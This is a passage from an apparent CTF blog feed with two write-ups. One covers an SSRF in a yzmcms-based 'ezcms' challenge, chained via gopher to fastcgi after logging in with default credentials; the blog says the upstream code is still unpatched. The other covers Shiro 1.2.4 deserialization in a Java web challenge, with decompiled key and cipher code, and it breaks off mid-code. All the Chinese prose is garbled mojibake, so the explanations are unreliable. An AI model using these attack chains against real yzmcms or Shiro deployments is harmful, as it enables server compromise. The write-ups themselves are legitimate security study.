      &lt;p&gt;ä¹‹å‰éƒ½æ˜¯ ysoserial ä¸€æŠŠæ¢­, è¿˜æ˜¯å¾—å­¦ä¹  + å¤ç°ä¸€ä¸‹å†…éƒ¨å®ç°æœºåˆ¶çš„.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="java" scheme="https://rmb122.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>2019 é«˜æ ¡è¿ç»´ ezcms å¤ç°</title>
    <link href="https://rmb122.com/2020/01/13/2019-%E9%AB%98%E6%A0%A1%E8%BF%90%E7%BB%B4-ezcms-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://rmb122.com/2020/01/13/2019-%E9%AB%98%E6%A0%A1%E8%BF%90%E7%BB%B4-ezcms-%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-01-12T16:04:55.000Z</published>
    <updated>2020-01-12T16:06:35.271Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰é«˜æ ¡è¿ç»´ç¢°åˆ°çš„é¢˜ç›®, å½“æ—¶å°±æˆ‘ä¸€ä¸ªäººè¾“å‡º web + è‡ªå·±å¤ªèœäº†, å°±æ²¡åšå‡ºæ¥ _(:3ã€âˆ )_, å¯’å‡æœ‰æ—¶é—´çœ‹çœ‹, å¤ç°ä¸€ä¸‹é¢˜ç›®.</p><a id="more"></a><p>é¢˜ç›®éå¸¸è‰¯å¿ƒçš„ç»™äº† docker-compose.yml, æ‰€ä»¥æ­å»ºç¯å¢ƒå¾ˆç®€å•. æŠŠ install.lock åˆ æ‰é‡æ–°è£…ä¸€éå°± ok.<br>ç»è¿‡ä¸€æ®µæ—¶é—´å®¡è®¡, å¯ä»¥å‘ç° <code>application/collection/controller/collection_content.class.php</code> ä¸­ <code>collection_test</code> ç­‰å‡½æ•°, å®é™…ä¸Šæœªç»ä»»ä½•è¿‡æ»¤å°±å°† URL ä¼ ç»™äº† <code>collection::get_content</code>.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* æ·»åŠ é‡‡é›†èŠ‚ç‚¹</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'dosubmit'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!$_POST[<span class="string">'urlpage'</span>]) showmsg(<span class="string">'ç½‘å€é…ç½®ä¸èƒ½ä¸ºç©ºï¼'</span>);</span><br><span class="line">        $res = D(<span class="string">'collection_node'</span>)-&gt;insert($_POST);</span><br><span class="line">        <span class="keyword">if</span> ($res) &#123;</span><br><span class="line">            showmsg(L(<span class="string">'operation_success'</span>), U(<span class="string">'init'</span>), <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            showmsg(L(<span class="string">'operation_failure'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="keyword">$this</span>-&gt;admin_tpl(<span class="string">'collection_node_add'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">collection_test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) ? intval($_GET[<span class="string">'id'</span>]) : <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!$id) showmsg(L(<span class="string">'lose_parameters'</span>));</span><br><span class="line">    $data = D(<span class="string">'collection_node'</span>)-&gt;where(<span class="keyword">array</span>(<span class="string">'nodeid'</span> =&gt; $id))-&gt;find();</span><br><span class="line">    <span class="keyword">if</span> ($data[<span class="string">'urlpage'</span>] == <span class="string">''</span>) showmsg(<span class="string">'ç½‘å€é…ç½®ä¸èƒ½ä¸ºç©ºï¼'</span>, <span class="string">'stop'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ç›®æ ‡ç½‘å€</span></span><br><span class="line">    <span class="keyword">if</span> ($data[<span class="string">'sourcetype'</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">        $url = str_replace(<span class="string">'(*)'</span>, $data[<span class="string">'pagesize_start'</span>], $data[<span class="string">'urlpage'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $url = $data[<span class="string">'urlpage'</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å®šä¹‰é‡‡é›†åˆ—è¡¨åŒºé—´</span></span><br><span class="line">    $url_start = $data[<span class="string">'url_start'</span>];</span><br><span class="line">    $url_end = $data[<span class="string">'url_end'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($url_start == <span class="string">''</span> || $url_end == <span class="string">''</span>) showmsg(<span class="string">'åˆ—è¡¨åŒºåŸŸé…ç½®ä¸èƒ½ä¸ºç©ºï¼'</span>, <span class="string">'stop'</span>);</span><br><span class="line"></span><br><span class="line">    $content = collection::get_content($url);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_content</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">self</span>::$url = $url;</span><br><span class="line"></span><br><span class="line">    $content = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span> (extension_loaded(<span class="string">'curl'</span>)) &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">FALSE</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">FALSE</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        $content = curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $content = @file_get_contents($url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> trim($content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾çš„ SSRF, å†ç»“åˆ nginx é…ç½®.</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">    <span class="attribute">include</span> snippets/fastcgi-php.conf;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># With php-fpm (or other unix sockets):</span></span><br><span class="line"><span class="comment">#fastcgi_pass unix:/run/php/php7.3-fpm.sock;</span></span><br><span class="line">    <span class="comment"># With php-cgi (or other tcp sockets):</span></span><br><span class="line">    <span class="attribute">fastcgi_pass</span> <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜æ˜¾å°±æ˜¯ gopher æ‰“ fastcgi äº†.</p><p>æ ¹æ® view é‡Œçš„æ–‡å­—, å¯ä»¥çŒœå‡ºæ˜¯é‡‡é›†åŠŸèƒ½. ç”¨é»˜è®¤è´¦å·å¯†ç  yzmcms ç™»å½•è¿›åå°ä¹‹ååœ¨æ¨¡å—ç®¡ç†é‡Œé¢å°±èƒ½æ‰¾åˆ°, æ‹¿ gopherus ä¸€æŠŠæ¢­å°±å¯ä»¥.</p><p>ç„¶åæˆ‘å»çœ‹äº†çœ¼æœ€æ–°ä»£ç  <code>https://github.com/yzmcms/yzmcms</code>. ä»ç„¶æ²¡æœ‰ä¿®å¤, æ€ªä¸å¾— wp è¿˜æ²¡å‡ºæ¥ (é€ƒ</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä¹‹å‰é«˜æ ¡è¿ç»´ç¢°åˆ°çš„é¢˜ç›®, å½“æ—¶å°±æˆ‘ä¸€ä¸ªäººè¾“å‡º web + è‡ªå·±å¤ªèœäº†, å°±æ²¡åšå‡ºæ¥ _(:3ã€âˆ )_, å¯’å‡æœ‰æ—¶é—´çœ‹çœ‹, å¤ç°ä¸€ä¸‹é¢˜ç›®.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="writeup" scheme="https://rmb122.com/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>OGeek çº¿ä¸‹ Java Web And XCTF Final babytaint Writeup</title>
    <link href="https://rmb122.com/2019/10/31/OGeek-%E7%BA%BF%E4%B8%8B-Java-Web-And-XCTF-Final-babytaint-Writeup/"/>
    <id>https://rmb122.com/2019/10/31/OGeek-%E7%BA%BF%E4%B8%8B-Java-Web-And-XCTF-Final-babytaint-Writeup/</id>
    <published>2019-10-31T14:37:15.000Z</published>
    <updated>2019-10-31T15:08:11.950Z</updated>
    
    <content type="html"><![CDATA[<p>å› ä¸ºæœ€è¿‘è¯¾ç¨‹éå¸¸éå¸¸å¤š, è¿˜é¡ºå¸¦è€ƒè¯• + å®éªŒæŠ¥å‘Š, å’•å’•å’•æ‰äº†è®¸å¤šæ¯”èµ›, çœŸæ­£å»çš„ä¹Ÿåªæœ‰ OGeek, å…¶ä»–éƒ½æ˜¯äº‘æ¯”èµ›.<br>æ‹¿åšå‡ºæ¥çš„é¢˜ç›®é‡Œé¢é€‰ä¸¤é¢˜å†™ä¸ª Writeup å§, ä¸ç„¶å¤ªä¹…æ²¡æ›´æ–°äº† (é€ƒ</p><a id="more"></a><h2 id="Java-Web"><a href="#Java-Web" class="headerlink" title="Java Web"></a>Java Web</h2><p>è¿™é¢˜è¿æ°”æ¯”è¾ƒå¥½, æ‹¿äº†ä¸€è¡€<br>æ‹¿åˆ°é¢˜ç›®å¯ä»¥çœ‹åˆ°ä¸€å † jsp, å¯ä»¥ç¡®å®šæ˜¯ java web.  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ tree -L 2 . --dirsfirst</span><br><span class="line">.</span><br><span class="line">â”œâ”€â”€ css</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ main.css</span><br><span class="line">â”‚Â Â  â””â”€â”€ util.css</span><br><span class="line">â”œâ”€â”€ fonts</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ font-awesome-4.7.0</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ iconic</span><br><span class="line">â”‚Â Â  â””â”€â”€ poppins</span><br><span class="line">â”œâ”€â”€ images</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ icons</span><br><span class="line">â”‚Â Â  â””â”€â”€ bg-01.jpg</span><br><span class="line">â”œâ”€â”€ js</span><br><span class="line">â”‚Â Â  â””â”€â”€ main.js</span><br><span class="line">â”œâ”€â”€ META-INF</span><br><span class="line">â”‚Â Â  â””â”€â”€ MANIFEST.MF</span><br><span class="line">â”œâ”€â”€ vendor</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ animate</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ animsition</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ bootstrap</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ countdowntime</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ css-hamburgers</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ daterangepicker</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ jquery</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ perfect-scrollbar</span><br><span class="line">â”‚Â Â  â””â”€â”€ select2</span><br><span class="line">â”œâ”€â”€ WEB-INF</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ classes</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ lib</span><br><span class="line">â”‚Â Â  â””â”€â”€ web.xml</span><br><span class="line">â”œâ”€â”€ error.jsp</span><br><span class="line">â”œâ”€â”€ index.jsp</span><br><span class="line">â”œâ”€â”€ login.jsp</span><br><span class="line">â””â”€â”€ success.jsp</span><br></pre></td></tr></table></figure><p>é€»è¾‘æ¯”è¾ƒç®€å•, æ¼æ´ä¹Ÿä¸åœ¨è¿™äº› jsp é‡Œé¢</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%<span class="meta">@taglib</span> prefix=<span class="string">"shiro"</span> uri=<span class="string">"http://shiro.apache.org/tags"</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Login V3&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span><br><span class="line">    &lt;!--===============================================================================================--&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"icon"</span> type=<span class="string">"image/png"</span> href=<span class="string">"images/icons/favicon.ico"</span>/&gt;</span><br><span class="line">    &lt;!--===============================================================================================--&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"vendor/bootstrap/css/bootstrap.min.css"</span>&gt;</span><br><span class="line">    &lt;!--===============================================================================================--&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"fonts/font-awesome-4.7.0/css/font-awesome.min.css"</span>&gt;</span><br><span class="line">    &lt;!--===============================================================================================--&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"fonts/iconic/css/material-design-iconic-font.min.css"</span>&gt;</span><br><span class="line">    &lt;!--===============================================================================================--&gt;</span><br><span class="line">&lt;!-- çœç•¥æ‰ä¸€äº› html --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">&lt;form action=<span class="string">"/register"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span> value=<span class="string">""</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"password"</span> value=<span class="string">""</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"submit"</span>&gt;&lt;br&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° shiro, æ³¨æ„ <code>WEB-INF/lib/</code> é‡Œé¢çš„ <code>shiro-core-1.2.4.jar</code> æ˜¯å­˜åœ¨æ¼æ´çš„ç‰ˆæœ¬, å¯ä»¥åˆ©ç”¨ java ååºåˆ—åŒ–æ‰§è¡Œå‘½ä»¤.<br>é‚ç›´æ¥ç”¨äº†ä¹‹å‰çš„æ‰¾çš„ exp, ä½†æ˜¯ JRMPClient å¹¶æ²¡æœ‰å›è¿çš„ååº”, å†çœ‹çœ‹ web.xml</p><p>web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-value</span>&gt;</span></span><br><span class="line">    classpath:spring-shiro.xml</span><br><span class="line">  <span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>shiroFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.DelegatingFilterProxy<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">async-supported</span>&gt;</span>true<span class="tag">&lt;/<span class="name">async-supported</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>targetFilterLifecycle<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>shiroFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ‰¾åˆ° WEB-INF/classes/spring-shiro.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- çœç•¥æ‰ä¸€äº›æ²¡ç”¨çš„é…ç½® --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- rememberMeç®¡ç†å™¨ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"rememberMeManager"</span> <span class="attr">class</span>=<span class="string">"com.collection.shiro.manager.ShiroRememberManager"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"cookie"</span> <span class="attr">ref</span>=<span class="string">"rememberMeCookie"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- çœç•¥æ‰ä¸€äº›æ²¡ç”¨çš„é…ç½® --&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å‡ºé¢˜äººç”¨äº†è‡ªå·±å®ç°çš„ rememberMeManager, æˆ‘ä»¬æå‡º jd-gui çœ‹çœ‹.</p><p>WEB-INF/classes/com/collection/shiro/manager/ShiroRememberManager.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[] getKeyFromConfig() &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        InputStream fileInputStream = getClass().getResourceAsStream(<span class="string">"remember.key"</span>);</span><br><span class="line">        String key = <span class="string">""</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (fileInputStream == <span class="keyword">null</span> || fileInputStream.available() &lt; <span class="number">32</span>) &#123;</span><br><span class="line">        BufferedWriter writer = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> FileWriter(getClass().getResource(<span class="string">"/"</span>).getPath() + <span class="string">"com/collection/shiro/manager/remember.key"</span>));</span><br><span class="line">        key = RandomStringUtils.random(<span class="number">32</span>, <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()_="</span>);</span><br><span class="line">        writer.write(key);</span><br><span class="line">        writer.close();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[fileInputStream.available()];</span><br><span class="line">        fileInputStream.read(bytes);</span><br><span class="line">        key = <span class="keyword">new</span> String(bytes);</span><br><span class="line">        fileInputStream.close();</span><br><span class="line">        &#125; </span><br><span class="line">        key = (<span class="keyword">new</span> Md5Hash(key)).toString();</span><br><span class="line">        <span class="keyword">return</span> key.getBytes();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>WEB-INF/classes/com/collection/shiro/crypto/ShiroCipherService.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShiroCipherService</span> <span class="keyword">implements</span> <span class="title">CipherService</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> ByteSource <span class="title">decrypt</span><span class="params">(<span class="keyword">byte</span>[] ciphertext, <span class="keyword">byte</span>[] key)</span> <span class="keyword">throws</span> CryptoException </span>&#123;</span><br><span class="line">    String skey = (<span class="keyword">new</span> Sha1Hash(<span class="keyword">new</span> String(key))).toString();</span><br><span class="line">    <span class="keyword">byte</span>[] bkey = skey.getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] data_bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[ciphertext.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ciphertext.length; i++) &#123;</span><br><span class="line">      data_bytes[i] = (<span class="keyword">byte</span>)(ciphertext[i] ^ bkey[i % bkey.length]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">byte</span>[] jsonData = <span class="keyword">new</span> <span class="keyword">byte</span>[ciphertext.length / <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; jsonData.length; i++) &#123;</span><br><span class="line">      jsonData[i] = (<span class="keyword">byte</span>)(data_bytes[i * <span class="number">2</span>] ^ data_bytes[i * <span class="number">2</span> + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    JSONObject jsonObject = <span class="keyword">new</span> JSONObject(<span class="keyword">new</span> String(jsonData));</span><br><span class="line">    String serial = (String)jsonObject.get(<span class="string">"serialize_data"</span>);</span><br><span class="line">    <span class="keyword">return</span> ByteSource.Util.bytes(Base64.getDecoder().decode(serial));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> ByteSource <span class="title">encrypt</span><span class="params">(<span class="keyword">byte</span>[] plaintext, <span class="keyword">byte</span>[] key)</span> <span class="keyword">throws</span> CryptoException </span>&#123;</span><br><span class="line">    String sign = (<span class="keyword">new</span> Md5Hash(UUID.randomUUID().toString())).toString() + <span class="string">"asfda-92u134-"</span>;</span><br><span class="line">    Subject subject = SecurityUtils.getSubject();</span><br><span class="line">    HttpServletRequest servletRequest = WebUtils.getHttpRequest(subject);</span><br><span class="line">    String user_agent = servletRequest.getHeader(<span class="string">"User-Agent"</span>);</span><br><span class="line">    String ip_address = servletRequest.getHeader(<span class="string">"X-Forwarded-For"</span>);</span><br><span class="line">    ip_address = (ip_address == <span class="keyword">null</span>) ? servletRequest.getRemoteAddr() : ip_address;</span><br><span class="line">    String data = <span class="string">"&#123;\"user_is_login\":\"1\",\"sign\":\""</span> + sign + <span class="string">"\",\"ip_address\":\""</span> + ip_address + <span class="string">"\",\"user_agent\":\""</span> + user_agent + <span class="string">"\",\"serialize_data\":\""</span> + 